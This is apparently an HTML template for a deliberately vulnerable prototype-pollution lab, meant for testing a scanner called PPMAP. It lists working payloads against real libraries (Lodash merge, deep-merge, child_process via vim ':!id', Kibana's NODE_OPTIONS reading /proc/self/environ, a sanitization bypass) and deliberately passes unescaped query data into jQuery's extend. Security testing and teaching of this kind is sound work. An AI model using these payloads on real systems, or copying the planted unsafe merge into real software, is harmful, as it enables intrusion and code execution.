<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><%= title %></title>
    <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
        }
        h1 {
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .warning {
            background: rgba(255, 59, 48, 0.2);
            border-left: 4px solid #ff3b30;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .endpoint-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        .endpoint {
            background: rgba(255, 255, 255, 0.15);
            padding: 15px;
            border-radius: 10px;
            transition: transform 0.2s;
            position: relative;
        }
        .endpoint:hover {
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.25);
        }
        .tier-badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 0.8em;
            font-weight: bold;
            margin-right: 5px;
        }
        .tier-0 { background: #ff3b30; }
        .tier-1 { background: #ff9500; }
        .tier-2 { background: #ffcc00; }
        .tier-3 { background: #34c759; }
        .tier-4 { background: #007aff; }
        .tier-5 { background: #5856d6; }
        .tier-6 { background: #af52de; }
        code {
            display: block;
            background: rgba(0, 0, 0, 0.3);
            padding: 5px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
            white-space: pre-wrap;
            word-break: break-all;
            font-size: 0.9em;
        }
        button.test-btn {
            background: #28a745;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9em;
            margin-top: 5px;
        }
        button.test-btn:hover {
            background: #218838;
        }
        .result-box {
            display: none;
            margin-top: 10px;
            background: rgba(0,0,0,0.5);
            padding: 5px;
            border-radius: 3px;
            font-size: 0.8em;
            color: #adff2f;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîì PPMAP Vulnerable Lab</h1>
        <p style="text-align: center; font-size: 1.2em;">Comprehensive Prototype Pollution Testing Environment</p>
        
        <div class="warning">
            <strong>‚ö†Ô∏è WARNING:</strong> This application is INTENTIONALLY VULNERABLE for security testing purposes only.
            <br>DO NOT deploy to production or expose to public internet!
        </div>

        <h2>üìä Lab Statistics</h2>
        <ul>
            <li><strong>Detection Methods:</strong> 28</li>
            <li><strong>Tier Levels:</strong> 6 (Tier 0-5)</li>
            <li><strong>Endpoints:</strong> 15</li>
            <li><strong>CVEs Covered:</strong> 15</li>
        </ul>

        <h2>üéØ Available Endpoints</h2>
        <div class="endpoint-list">
            
            <div class="endpoint">
                <span class="tier-badge tier-0">Tier 0</span>
                <h3>POST /api/merge</h3>
                <p>Lodash _.merge (CVE-2020-8203)</p>
                <code>{"__proto__":{"isAdmin":true}}</code>
                <button class="test-btn" onclick='runTest(this, "/api/merge", "POST", {"__proto__":{"isAdmin":true}})'>Run PoC</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-6">Tier 6</span>
                <h3>POST /api/deep-merge</h3>
                <p>deep-merge RCE (CVE-2024-38986)</p>
                <code>{"__proto__":{"shell":"vim"}}</code>
                <button class="test-btn" onclick='runTest(this, "/api/deep-merge", "POST", {"__proto__":{"shell":"vim"}})'>Run PoC</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-3">Tier 3</span>
                <h3>POST /api/child-process</h3>
                <p>child_process RCE</p>
                <code>{"__proto__":{"shell":"vim","input":":!id\\n"}}</code>
                <button class="test-btn" onclick='runTest(this, "/api/child-process", "POST", {"__proto__":{"shell":"vim","input":":!id\\n"}})'>Run PoC</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-6">Tier 6</span>
                <h3>POST /api/telemetry</h3>
                <p>Kibana Telemetry ($10k bounty)</p>
                <code>{"path":"__proto__.env.NODE_OPTIONS","value":"--require /proc/self/environ"}</code>
                <button class="test-btn" onclick='runTest(this, "/api/telemetry", "POST", {"path":"__proto__.env.NODE_OPTIONS","value":"--require /proc/self/environ"})'>Run PoC</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-5">Tier 5</span>
                <h3>POST /api/cors</h3>
                <p>CORS Header Pollution</p>
                <code>{"__proto__":{"exposedHeaders":"X-Polluted"}}</code>
                <button class="test-btn" onclick='runTest(this, "/api/cors", "POST", {"__proto__":{"exposedHeaders":"X-Polluted"}})'>Run PoC</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-4">Tier 4</span>
                <h3>POST /api/constructor</h3>
                <p>Constructor-based Bypass</p>
                <code>{"constructor":{"prototype":{"polluted":true}}}</code>
                <button class="test-btn" onclick='runTest(this, "/api/constructor", "POST", {"constructor":{"prototype":{"polluted":true}}})'>Run PoC</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-4">Tier 4</span>
                <h3>POST /api/sanitize</h3>
                <p>Sanitization Bypass</p>
                <code>{"__pro__proto__to__":{"bypass":true}}</code>
                <button class="test-btn" onclick='runTest(this, "/api/sanitize", "POST", {"__pro__proto__to__":{"bypass":true}})'>Run PoC</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-4">Tier 4</span>
                <h3>POST /api/descriptor</h3>
                <p>Descriptor Pollution</p>
                <code>{"__proto__":{"value":"polluted"}}</code>
                <button class="test-btn" onclick='runTest(this, "/api/descriptor", "POST", {"__proto__":{"value":"polluted"}})'>Run PoC</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-4">Tier 4</span>
                <h3>POST /api/gadgets</h3>
                <p>Blind Gadget Fuzzing</p>
                <code>{"__proto__":{"shell":"test"}}</code>
                <button class="test-btn" onclick='runTest(this, "/api/gadgets", "POST", {"__proto__":{"shell":"test"}})'>Run PoC</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-5">Tier 5</span>
                <h3>GET /analytics</h3>
                <p>Google Analytics Gadget</p>
                <code>?__proto__[hitCallback]=alert(1)</code>
                <button class="test-btn" onclick='window.open("/analytics?__proto__[hitCallback]=alert(1)", "_blank")'>Open Link</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-5">Tier 5</span>
                <h3>GET /storage-test</h3>
                <p>Storage API Pollution</p>
                <code>?__proto__[testItem]=polluted</code>
                <button class="test-btn" onclick='window.open("/storage-test?__proto__[testItem]=polluted", "_blank")'>Open Link</button>
                <div class="result-box"></div>
            </div>

            <div class="endpoint">
                <span class="tier-badge tier-6">Tier 6</span>
                <h3>POST /api/blitzjs</h3>
                <p>Blitz.js RCE Chain</p>
                <code>{"json":{"__proto__":{"shell":"vim"}}}</code>
                <button class="test-btn" onclick='runTest(this, "/api/blitzjs", "POST", {"json":{"__proto__":{"shell":"vim"}}})'>Run PoC</button>
                <div class="result-box"></div>
            </div>
        </div>

        <h2>üß™ Testing with PPMAP</h2>
        <pre style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 5px; overflow-x: auto;">
# Full scan (all 28 methods)
python3 ppmap.py --scan http://localhost:3000

# Specific endpoint
python3 ppmap.py --scan http://localhost:3000/api/merge

# With browser testing
python3 ppmap.py --scan http://localhost:3000 --browser chrome
        </pre>

        <h2>üìñ Documentation</h2>
        <p>See <code>README.md</code> for complete endpoint list and expected results.</p>
    </div>

    <script>
        async function runTest(btn, url, method, body) {
            const resultBox = btn.nextElementSibling;
            resultBox.style.display = 'block';
            resultBox.innerText = 'Sending payload...';
            
            try {
                const options = {
                    method: method,
                    headers: { 'Content-Type': 'application/json' }
                };
                if (method === 'POST') {
                    options.body = JSON.stringify(body);
                }
                
                const response = await fetch(url, options);
                const data = await response.json();
                
                resultBox.innerText = 'Status: ' + response.status + '\n' + JSON.stringify(data, null, 2).substring(0, 100) + '...';
                
                // Visual feedback of pollution
                if (data.prototype && data.prototype.isAdmin) {
                    resultBox.innerHTML += '<br><strong style="color:red">POLLUTION SUCCESSFUL!</strong>';
                }
            } catch (e) {
                resultBox.innerText = 'Error: ' + e.message;
            }
        }

        // jQuery PP vulnerability demonstration
        $(document).ready(function() {
            // Vulnerable to prototype pollution via query params
            const params = new URLSearchParams(window.location.search);
            params.forEach((value, key) => {
                if (key.includes('__proto__') || key.includes('constructor')) {
                    console.warn('Prototype pollution attempt detected:', key, value);
                }
            });

            // Simulate jQuery extend vulnerability
            $.extend(true, {}, <%= JSON.stringify(query) %>);
        });
    </script>
</body>
</html>
